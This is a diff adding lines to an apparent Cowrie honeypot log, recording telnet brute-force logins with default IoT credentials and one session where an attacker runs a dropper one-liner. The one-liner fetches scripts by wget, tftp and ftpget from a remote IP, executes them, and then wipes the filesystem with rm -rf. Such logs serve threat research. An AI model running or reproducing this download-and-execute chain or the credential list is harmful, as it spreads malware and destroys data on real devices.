@@ -5985,3 +5985,105 @@
 2017-05-14T04:22:57+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 52.15.233.30:49466 (10.8.41.81:2223) [session: TT68413]
 2017-05-14T04:22:57+0000 [HoneyPotSSHTransport,92577,91.197.235.11] connection lost
 2017-05-14T04:22:57+0000 [HoneyPotSSHTransport,92577,91.197.235.11] Connection lost after 3 seconds
+2017-05-14T04:23:01+0000 [CowrieTelnetTransport,68413,52.15.233.30] login attempt: 19522
+2017-05-14T04:23:01+0000 [CowrieTelnetTransport,68413,52.15.233.30] login return, expect: [support/support]
+2017-05-14T04:23:02+0000 [CowrieTelnetTransport,68413,52.15.233.30] login attempt [guest/12345] failed
+2017-05-14T04:23:02+0000 [CowrieTelnetTransport,68413,52.15.233.30] Warning: state changed and new state returned
+2017-05-14T04:23:02+0000 [CowrieTelnetTransport,68411,46.166.185.242] Not storing duplicate content 402ffa937a26e7ea51c662d054443f590182af65e39f9fd93eb2639d304ffb3a
+2017-05-14T04:23:02+0000 [CowrieTelnetTransport,68411,46.166.185.242] Saved redir contents with SHA-256 402ffa937a26e7ea51c662d054443f590182af65e39f9fd93eb2639d304ffb3a to dl/402ffa937a26e7ea51c662d054443f590182af65e39f9fd93eb2639d304ffb3a
+2017-05-14T04:23:02+0000 [CowrieTelnetTransport,68411,46.166.185.242] Not storing duplicate content c763a838b822618fa12eb4eabafa677dda8a64f5d4e9d5af78a00a627b7aca80
+2017-05-14T04:23:02+0000 [CowrieTelnetTransport,68411,46.166.185.242] Saved redir contents with SHA-256 c763a838b822618fa12eb4eabafa677dda8a64f5d4e9d5af78a00a627b7aca80 to dl/c763a838b822618fa12eb4eabafa677dda8a64f5d4e9d5af78a00a627b7aca80
+2017-05-14T04:23:02+0000 [CowrieTelnetTransport,68411,46.166.185.242] Closing TTY Log: log/tty/20170514-042247-None-68411i.log after 14 seconds
+2017-05-14T04:23:02+0000 [CowrieTelnetTransport,68411,46.166.185.242] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-05-14T04:23:02+0000 [CowrieTelnetTransport,68411,46.166.185.242] Connection lost after 17 seconds
+2017-05-14T04:23:02+0000 [CowrieTelnetTransport,68413,52.15.233.30] login attempt: 19523
+2017-05-14T04:23:02+0000 [CowrieTelnetTransport,68413,52.15.233.30] login return, expect: [support/support]
+2017-05-14T04:23:03+0000 [CowrieTelnetTransport,68413,52.15.233.30] login attempt [enable/shell] failed
+2017-05-14T04:23:03+0000 [CowrieTelnetTransport,68413,52.15.233.30] Warning: state changed and new state returned
+2017-05-14T04:23:03+0000 [CowrieTelnetTransport,68413,52.15.233.30] login attempt: 19524
+2017-05-14T04:23:03+0000 [CowrieTelnetTransport,68413,52.15.233.30] login return, expect: [support/support]
+2017-05-14T04:23:04+0000 [CowrieTelnetTransport,68413,52.15.233.30] login attempt [sh//bin/busybox ECCHI] failed
+2017-05-14T04:23:04+0000 [CowrieTelnetTransport,68413,52.15.233.30] Warning: state changed and new state returned
+2017-05-14T04:23:18+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 46.166.185.242:45618 (10.8.41.81:2223) [session: TT68414]
+2017-05-14T04:23:18+0000 [CowrieTelnetTransport,68414,46.166.185.242] login attempt: 22
+2017-05-14T04:23:18+0000 [CowrieTelnetTransport,68414,46.166.185.242] login return, expect: [root/jauntech]
+2017-05-14T04:23:19+0000 [CowrieTelnetTransport,68414,46.166.185.242] login attempt [root/jauntech] succeeded
+2017-05-14T04:23:21+0000 [CowrieTelnetTransport,68414,46.166.185.242] Opening TTY Log: log/tty/20170514-042321-None-68414i.log
+2017-05-14T04:23:21+0000 [CowrieTelnetTransport,68414,46.166.185.242] Warning: state changed and new state returned
+2017-05-14T04:23:21+0000 [CowrieTelnetTransport,68414,46.166.185.242] CMD: sh
+2017-05-14T04:23:21+0000 [CowrieTelnetTransport,68414,46.166.185.242] Command found: sh 
+2017-05-14T04:23:21+0000 [CowrieTelnetTransport,68414,46.166.185.242] CMD: shell
+2017-05-14T04:23:21+0000 [CowrieTelnetTransport,68414,46.166.185.242] Command not found: shell
+2017-05-14T04:23:21+0000 [CowrieTelnetTransport,68414,46.166.185.242] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.242/c0cK69.sh; chmod 777 c0cK69.sh; sh c0cK69.sh; tftp 46.166.185.242 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 46.166.185.242; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.242 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf c0cK69.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-05-14T04:23:21+0000 [CowrieTelnetTransport,68414,46.166.185.242] Command found: cd /tmp
+2017-05-14T04:23:21+0000 [CowrieTelnetTransport,68414,46.166.185.242] Command found: cd /var/run
+2017-05-14T04:23:21+0000 [CowrieTelnetTransport,68414,46.166.185.242] Command found: cd /mnt
+2017-05-14T04:23:21+0000 [CowrieTelnetTransport,68414,46.166.185.242] Command found: cd /root
+2017-05-14T04:23:21+0000 [CowrieTelnetTransport,68414,46.166.185.242] Command found: cd /
+2017-05-14T04:23:21+0000 [CowrieTelnetTransport,68414,46.166.185.242] Command found: wget http://46.166.185.242/c0cK69.sh
+2017-05-14T04:23:21+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://46.166.185.242/c0cK69.sh>
+2017-05-14T04:23:21+0000 [HTTPPageDownloader,client] Not storing duplicate content c763a838b822618fa12eb4eabafa677dda8a64f5d4e9d5af78a00a627b7aca80
+2017-05-14T04:23:21+0000 [HTTPPageDownloader,client] Downloaded URL (http://46.166.185.242/c0cK69.sh) with SHA-256 c763a838b822618fa12eb4eabafa677dda8a64f5d4e9d5af78a00a627b7aca80 to dl/c763a838b822618fa12eb4eabafa677dda8a64f5d4e9d5af78a00a627b7aca80
+2017-05-14T04:23:21+0000 [HTTPPageDownloader,client] Command found: chmod 777 /c0cK69.sh
+2017-05-14T04:23:21+0000 [HTTPPageDownloader,client] Command found: sh /c0cK69.sh
+2017-05-14T04:23:21+0000 [HTTPPageDownloader,client] Command found: tftp 46.166.185.242 -c get tftp1.sh
+2017-05-14T04:23:21+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-05-14T04:23:21+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-05-14T04:23:21+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 46.166.185.242
+2017-05-14T04:23:21+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-05-14T04:23:21+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-05-14T04:23:21+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 46.166.185.242 ftp1.sh ftp1.sh
+2017-05-14T04:23:21+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://46.166.185.242/ftp1.sh) with SHA-256 402ffa937a26e7ea51c662d054443f590182af65e39f9fd93eb2639d304ffb3a to dl/402ffa937a26e7ea51c662d054443f590182af65e39f9fd93eb2639d304ffb3a
+2017-05-14T04:23:21+0000 [HTTPPageDownloader,client] Command found: sh /ftp1.sh
+2017-05-14T04:23:21+0000 [HTTPPageDownloader,client] Command found: rm -rf /c0cK69.sh tftp1.sh tftp2.sh /ftp1.sh
+2017-05-14T04:23:21+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-05-14T04:23:21+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://46.166.185.242/c0cK69.sh>
+2017-05-14T04:23:21+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 139.162.75.112:53886 (10.8.41.81:2223) [session: TT68415]
+2017-05-14T04:23:28+0000 [CowrieTelnetTransport,68412,52.15.233.30] Connection lost after 40 seconds
+2017-05-14T04:23:35+0000 [CowrieTelnetTransport,68414,46.166.185.242] Not storing duplicate content 402ffa937a26e7ea51c662d054443f590182af65e39f9fd93eb2639d304ffb3a
+2017-05-14T04:23:35+0000 [CowrieTelnetTransport,68414,46.166.185.242] Saved redir contents with SHA-256 402ffa937a26e7ea51c662d054443f590182af65e39f9fd93eb2639d304ffb3a to dl/402ffa937a26e7ea51c662d054443f590182af65e39f9fd93eb2639d304ffb3a
+2017-05-14T04:23:35+0000 [CowrieTelnetTransport,68414,46.166.185.242] Not storing duplicate content c763a838b822618fa12eb4eabafa677dda8a64f5d4e9d5af78a00a627b7aca80
+2017-05-14T04:23:35+0000 [CowrieTelnetTransport,68414,46.166.185.242] Saved redir contents with SHA-256 c763a838b822618fa12eb4eabafa677dda8a64f5d4e9d5af78a00a627b7aca80 to dl/c763a838b822618fa12eb4eabafa677dda8a64f5d4e9d5af78a00a627b7aca80
+2017-05-14T04:23:35+0000 [CowrieTelnetTransport,68414,46.166.185.242] Closing TTY Log: log/tty/20170514-042321-None-68414i.log after 14 seconds
+2017-05-14T04:23:35+0000 [CowrieTelnetTransport,68414,46.166.185.242] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-05-14T04:23:35+0000 [CowrieTelnetTransport,68414,46.166.185.242] Connection lost after 17 seconds
+2017-05-14T04:23:35+0000 [CowrieTelnetTransport,68413,52.15.233.30] Connection lost after 38 seconds
+2017-05-14T04:23:36+0000 [CowrieTelnetTransport,68415,139.162.75.112] Connection lost after 14 seconds
+2017-05-14T04:23:36+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 139.162.75.112:50026 (10.8.41.81:2223) [session: TT68416]
+2017-05-14T04:23:36+0000 [CowrieTelnetTransport,68416,139.162.75.112] Connection lost after 0 seconds
+2017-05-14T04:23:36+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 139.162.75.112:51032 (10.8.41.81:2223) [session: TT68417]
+2017-05-14T04:23:37+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 52.15.233.30:37198 (10.8.41.81:2223) [session: TT68418]
+2017-05-14T04:23:37+0000 [CowrieTelnetTransport,68417,139.162.75.112] Connection lost after 0 seconds
+2017-05-14T04:23:37+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 139.162.75.112:51632 (10.8.41.81:2223) [session: TT68419]
+2017-05-14T04:23:37+0000 [CowrieTelnetTransport,68419,139.162.75.112] login attempt: 32
+2017-05-14T04:23:37+0000 [CowrieTelnetTransport,68419,139.162.75.112] login return, expect: [GET http://clientapi.ipip.net/echo.php?info=20170415042715 HTTP/1.1/Host: clientapi.ipip.net]
+2017-05-14T04:23:38+0000 [CowrieTelnetTransport,68419,139.162.75.112] login attempt [GET http://clientapi.ipip.net/echo.php?info=20170514122257 HTTP/1.1/Host: clientapi.ipip.net] failed
+2017-05-14T04:23:38+0000 [CowrieTelnetTransport,68419,139.162.75.112] Warning: state changed and new state returned
+2017-05-14T04:23:38+0000 [CowrieTelnetTransport,68419,139.162.75.112] login attempt: 33
+2017-05-14T04:23:38+0000 [CowrieTelnetTransport,68419,139.162.75.112] login return, expect: [GET http://clientapi.ipip.net/echo.php?info=20170415042715 HTTP/1.1/Host: clientapi.ipip.net]
+2017-05-14T04:23:39+0000 [CowrieTelnetTransport,68419,139.162.75.112] login attempt [Accept: */*/Pragma: no-cache] failed
+2017-05-14T04:23:39+0000 [CowrieTelnetTransport,68419,139.162.75.112] Warning: state changed and new state returned
+2017-05-14T04:23:39+0000 [CowrieTelnetTransport,68419,139.162.75.112] login attempt: 34
+2017-05-14T04:23:39+0000 [CowrieTelnetTransport,68419,139.162.75.112] login return, expect: [GET http://clientapi.ipip.net/echo.php?info=20170415042715 HTTP/1.1/Host: clientapi.ipip.net]
+2017-05-14T04:23:40+0000 [CowrieTelnetTransport,68419,139.162.75.112] login attempt [User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64)/] failed
+2017-05-14T04:23:40+0000 [CowrieTelnetTransport,68419,139.162.75.112] Warning: state changed and new state returned
+2017-05-14T04:23:41+0000 [CowrieTelnetTransport,68419,139.162.75.112] Connection lost after 3 seconds
+2017-05-14T04:23:41+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 139.162.75.112:57534 (10.8.41.81:2223) [session: TT68420]
+2017-05-14T04:23:41+0000 [CowrieTelnetTransport,68420,139.162.75.112] Connection lost after 0 seconds
+2017-05-14T04:23:41+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 139.162.75.112:58606 (10.8.41.81:2223) [session: TT68421]
+2017-05-14T04:23:42+0000 [CowrieTelnetTransport,68418,52.15.233.30] login attempt: 19525
+2017-05-14T04:23:42+0000 [CowrieTelnetTransport,68418,52.15.233.30] login return, expect: [support/support]
+2017-05-14T04:23:43+0000 [CowrieTelnetTransport,68418,52.15.233.30] login attempt [root/888888] failed
+2017-05-14T04:23:43+0000 [CowrieTelnetTransport,68418,52.15.233.30] Warning: state changed and new state returned
+2017-05-14T04:23:44+0000 [CowrieTelnetTransport,68418,52.15.233.30] login attempt: 19526
+2017-05-14T04:23:44+0000 [CowrieTelnetTransport,68418,52.15.233.30] login return, expect: [support/support]
+2017-05-14T04:23:45+0000 [CowrieTelnetTransport,68418,52.15.233.30] login attempt [enable/shell] failed
+2017-05-14T04:23:45+0000 [CowrieTelnetTransport,68418,52.15.233.30] Warning: state changed and new state returned
+2017-05-14T04:23:47+0000 [CowrieTelnetTransport,68418,52.15.233.30] login attempt: 19527
+2017-05-14T04:23:47+0000 [CowrieTelnetTransport,68418,52.15.233.30] login return, expect: [support/support]
+2017-05-14T04:23:48+0000 [CowrieTelnetTransport,68418,52.15.233.30] login attempt [sh//bin/busybox ECCHI] failed
+2017-05-14T04:23:48+0000 [CowrieTelnetTransport,68418,52.15.233.30] Warning: state changed and new state returned
+2017-05-14T04:23:51+0000 [CowrieTelnetTransport,68421,139.162.75.112] Connection lost after 10 seconds
+2017-05-14T04:23:58+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 52.15.233.30:33681 (10.8.41.81:2223) [session: TT68422]
